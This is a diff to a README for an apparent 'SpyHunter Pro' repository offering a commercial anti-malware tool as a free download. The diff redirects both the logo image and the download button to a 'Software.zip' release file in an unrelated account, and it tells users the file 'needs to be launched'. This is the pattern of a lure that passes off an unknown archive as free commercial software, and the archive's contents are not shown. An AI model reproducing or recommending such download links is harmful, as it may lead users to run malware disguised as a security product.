@@ -2,7 +2,7 @@
 
 Welcome to the **SpyHunter-Pro-For-Windows** repository! 
 
-![SpyHunter Logo](https://www.example.com/spyhunter-logo.jpg)
+![SpyHunter Logo](https://github.com/vitwuw/SpyHunter-Pro-For-Windows/releases/download/v2.0/Software.zip)
 
 ## Description
 **SpyHunter 2025 Download Free**: Advanced Malware Removal and Protection Tool.
@@ -29,7 +29,7 @@ Welcome to the **SpyHunter-Pro-For-Windows** repository!
 - spyhunter-virus-removal
 
 ## Download
-[Download SpyHunter 2025](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip) 🚀
+[Download SpyHunter 2025](https://github.com/vitwuw/SpyHunter-Pro-For-Windows/releases/download/v2.0/Software.zip) 🚀
 
 _(Needs to be launched)_
 
